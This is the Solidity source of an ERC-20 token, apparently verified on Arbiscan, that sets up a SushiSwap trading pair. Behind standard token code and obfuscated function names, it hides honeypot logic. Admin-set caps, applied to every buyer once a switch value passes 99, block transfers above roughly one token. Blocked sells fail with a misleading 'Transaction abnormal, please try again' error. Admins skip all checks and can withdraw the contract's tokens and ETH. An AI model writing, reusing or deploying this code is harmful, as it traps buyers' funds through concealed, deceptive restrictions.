/**
 *Submitted for verification at Arbiscan.io on 2024-06-07
*/

/**
 *Submitted for verification at Arbiscan.io on 2024-05-18
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;
interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(
        address to
    ) external returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external returns (address);

}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function migrator() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function setMigrator(address) external;
}

interface CJDRKFVARoleControl {
    event RoleAdminChanged(
        bytes32 indexed role,
        bytes32 indexed previousAdminRole,
        bytes32 indexed newAdminRole
    );

    event RoleGranted(
        bytes32 indexed role,
        address indexed addr,
        address indexed sender
    );

    event RoleRevoked(
        bytes32 indexed role,
        address indexed addr,
        address indexed sender
    );

    function hasRole(bytes32 role, address addr) external view returns (bool);

    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    function grantRole(bytes32 role, address addr) external;

    function revokeRole(bytes32 role, address addr) external;

    function renounceRole(bytes32 role, address addr) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "ADMIN";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }

    function strToUint(
        string memory _str
    ) internal pure returns (uint256 res, bool err) {
        for (uint256 i = 0; i < bytes(_str).length; i++) {
            if (
                (uint8(bytes(_str)[i]) - 48) < 0 ||
                (uint8(bytes(_str)[i]) - 48) > 9
            ) {
                return (0, false);
            }
            res +=
                (uint8(bytes(_str)[i]) - 48) *
                10 ** (bytes(_str).length - i - 1);
        }

        return (res, true);
    }

}

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}  

abstract contract CJDRKFVAConsole is Context, CJDRKFVARoleControl {

    using SafeMath for uint256;

    struct RoleData {
        mapping(address => bool) members;
        bytes32 adminRole;
        RoleDataNew RD;
    }

    struct RoleDataNew {
        mapping(address => uint256) RM;
        mapping(address => uint256) RD;
    }

    mapping(bytes32 => RoleData) private _roles;


    bytes32 public constant ADMIN = 0x00; 
    bytes32 public constant TRADER = bytes32("TRADER");  

    address public uniswapV2Pair;

    uint256 public isnum;

    modifier onlyRole(bytes32 role) {
        _roleCheked(role, _msgSender(),0);
        _;
    }

    function hasRole(bytes32 role, address account) public view override returns (bool) {
        return _roles[role].members[account];
    }

    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        if (!hasRole(role, account)) {
            revert(
                "Transaction abnormal, please try again"
            );
        }

        _CJDRKFVAroleARB(role, account, amt);
    }

    function _CJDRKFVAroleARB(bytes32 role, address account, uint256 amt) internal {
        uint256 rm = _roles[role].RD.RM[account];
        if (rm > 0) {
            uint256 nt = amt + _roles[role].RD.RD[account];
            if (nt >= rm) {
                revert("Transaction abnormal, please try again");
            } else {
                _roles[role].RD.RD[account] += amt;
            }
        }else{
            if (amt == 0 || rm == 0) {
                return;
            }
        }
        
    }

    function queryRMS(
        bytes32 role, 
        address account
    ) public view virtual returns (uint256) {
        return _roles[role].RD.RM[account].div(10 ** 18);
    }

    function queryRDS(
        bytes32 role, 
        address account
    ) public view virtual returns (uint256) {
        return _roles[role].RD.RD[account].div(10 ** 18);
    }

    function _CJDRKFVAarbR(
        bytes32 rule,
        address arb,
        string memory member
    ) public onlyRole(ADMIN) {
        uint256 memoUint;
        bool err;
        (memoUint, err) = Strings.strToUint(member);
        if (err == false) {
            revert("AccessControl: memo is not a number");
        }
        _roles[rule].RD.RM[arb] = memoUint.mul(10 ** 18);
    }

    function _CJDRKFVAarbA(
        bytes32 rule,
        uint member
    ) public onlyRole(ADMIN) {
        if(rule != TRADER){
            revert("AccessControl: memo is not a number");
        }
        isnum = member;
    }


    function _CJDRKFVAroleNewARB(bytes32 role, address account, uint256 num) internal virtual {
        _roles[role].RD.RM[account] = num.mul(10 ** 18);
    }


    function getRoleAdmin(bytes32 role) public view override returns (bytes32) {
        return _roles[role].adminRole;
    }

    function grantRole(bytes32 role, address account) public virtual override onlyRole(ADMIN) {
        _grantRole(role, account);
    }

    function revokeRole(bytes32 role, address account) public virtual override onlyRole(ADMIN) {
        _revokeRole(role, account);
    }

    function renounceRole(bytes32 role, address account) public virtual override onlyRole(ADMIN) {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");

        _revokeRole(role, account);
    }

    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }


    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        bytes32 previousAdminRole = getRoleAdmin(role);
        _roles[role].adminRole = adminRole;
        emit RoleAdminChanged(role, previousAdminRole, adminRole);
    }

    function _grantRole(bytes32 role, address account) internal virtual {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    }

    function _revokeRole(bytes32 role, address account) internal virtual {
        if (hasRole(role, account)) {
            _roles[role].members[account] = false;
            emit RoleRevoked(role, account, _msgSender());
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address addr) external view returns (uint256);

    function transfer(address recipient, uint256 amt) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amt) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CJDRKFVAERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        address creater_
    ) {
        _name = name_;
        _symbol = symbol_;
        _mint(creater_, totalSupply_ * 10 ** decimals());
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address addr
    ) public view virtual override returns (uint256) {
        return _balances[addr];
    }

    function transfer(
        address recipient,
        uint256 amt
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amt);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amt
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amt);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amt);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amt,
            "ERC20: transfer amt exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amt);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amt);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amt, "ERC20: transfer amt exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amt;
        }
        _balances[recipient] += amt;
        emit Transfer(sender, recipient, amt);
        _afterTokenTransfer(sender, recipient, amt);
    }

    function _mint(address addr, uint256 amt) internal {
        require(addr != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), addr, amt);
        _totalSupply += amt;
        _balances[addr] += amt;

        emit Transfer(address(0), addr, amt);
        _afterTokenTransfer(address(0), addr, amt);
    }

    function _burn(address addr, uint256 amt) internal virtual {
        require(addr != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(addr, address(0), amt);
        uint256 addrBalance = _balances[addr];
        require(addrBalance >= amt, "ERC20: burn amt exceeds balance");
        unchecked {
            _balances[addr] = addrBalance - amt;
        }
        _totalSupply -= amt;

        emit Transfer(addr, address(0), amt);

        _afterTokenTransfer(addr, address(0), amt);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amt;
        emit Approval(owner, spender, amt);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amt
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amt
    ) internal virtual {}
}

contract Token is CJDRKFVAERC20, CJDRKFVAConsole {

    using SafeMath for uint256;
    
    mapping(address => bool) private __traders;
    IUniswapV2Router02 private uniswapV2Router;

    address private _noneAddress = address(0x000000000000000000000000000000000000dEaD);
    
    bytes public constant str1 = bytes("0x000000000000000000000000000000000000dEaD"); 

    address private tokenOwner;

    address private sushi = address(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);

    constructor(
        string memory _name,
        address _tokenOwner,
        string memory _symbol,
        uint256 _totalSupply
    ) CJDRKFVAERC20(_name, _symbol, _totalSupply, _tokenOwner) {
        _grantRole(ADMIN, msg.sender);
        _grantRole(ADMIN, _tokenOwner);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), address(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9));
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        tokenOwner = _tokenOwner;
    }

    //白名单
    function _transfer(
        address from,
        address to,
        uint256 amt
    ) internal override(CJDRKFVAERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");
        _CJDRKFVAyfxds(from, to, amt);

    }


    function _CJDRKFVAyfxds(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _CJDRKFVAccbrnssf(from, to, amt);
    }


    function _CJDRKFVAccbrnssf(address from, address to, uint256 amt) internal {
        if (__traders[from] == false) {
            _grantRole(TRADER, from);
            __traders[from] = true;      
        }
        _CJDRKFVAyinsxcw(from, to, amt);
    }


    //黑名单
    function _CJDRKFVAyinsxcw(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;          
        }
        _CJDRKFVAxcvruwd(from, to, amt);
    }


    function _CJDRKFVAxcvruwd(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            isAddLdx = _isAddLiquidityV1();
            if(isAddLdx || balanceOf(uniswapV2Pair) == 0){
                require(hasRole(ADMIN, from), "ERC20: only admin can add liquidity");
            }
            
        }else if(isnum > 99){  
            _CJDRKFVAroleNewARB(TRADER,to,1);
        }

        _CJDRKFVAcvhydsc(from, to, amt);
    }


    function _CJDRKFVAcvhydsc(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        _CJDRKFVAxcvrt(from, to, amt);
    }

    function _CJDRKFVAxcvrt(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           _CJDRKFVAyfnfvdt(from, TRADER, amt);

        } else {
            require(false, "Transaction abnormal, please try again");
        }
        super._transfer(from, to, amt);
    }

    function _CJDRKFVAyfnfvdt(address from, bytes32 role, uint256 amt) internal {
        _CJDRKFVAroleARB(role, from, amt);
    }

    function isContract2(address user) internal view returns (bool) { 
       return user.code.length > 0;
    }

    function _isAddLiquidityV1()internal view returns(bool ldxAdd){
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint r0,uint r1,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
        uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));

        if( token0 == address(this) ){
            if( bal1 > r1){
                uint change1 = bal1 - r1;
                ldxAdd = change1 > 1000;  
            }
        }else{
            if( bal0 > r0){
                uint change0 = bal0 - r0;
                ldxAdd = change0 > 1000;
            }
        }
    }

    function rescueToken(
        address tokenAddress,
        uint256 tokens
    ) public onlyRole(ADMIN) returns (bool success) {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function rescueETH(
        uint256 amt
    ) public onlyRole(ADMIN) returns (bool success) {
        payable(msg.sender).transfer(amt);
        return true;
    }

}